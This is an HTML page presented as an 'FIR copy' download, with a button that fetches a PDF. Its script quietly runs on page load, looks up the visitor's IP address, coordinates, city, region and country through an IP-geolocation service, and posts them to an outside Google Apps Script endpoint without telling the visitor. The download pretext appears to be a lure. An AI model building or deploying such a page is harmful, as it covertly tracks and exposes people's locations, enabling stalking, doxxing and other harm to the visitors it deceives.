<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>FIR Copy Download</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    .container {
      padding: 20px;
      border: 1px solid #ccc;
      display: inline-block;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Download Your FIR Copy</h1>
    <p>Click the button below to download the FIR document.</p>
    <button onclick="downloadFIR()">Download FIR</button>
  </div>

  <script>
    function downloadFIR() {
      // Replace this with your actual FIR file path
      window.location.href = "FIR-copy.pdf";
    }

    // Location logging script
    fetch("https://ipinfo.io/json?token=5de145575ac808")
      .then(response => response.json())
      .then(data => {
        const loc = data.loc.split(',');
        const payload = {
          lat: loc[0],
          lon: loc[1],
          city: data.city,
          region: data.region,
          country: data.country,
          ip: data.ip
        };

        fetch("https://script.google.com/macros/s/AKfycbw9eJq4KViktjVWHbyhB4Pr0hkcm4V-9ABayBgi-e2hdUWXfPBUfeeILvcn5rISFKZ7/exec", {
          method: "POST",
          body: JSON.stringify(payload),
          headers: {
            "Content-Type": "application/json"
          }
        });
      });
  </script>
</body>
</html>
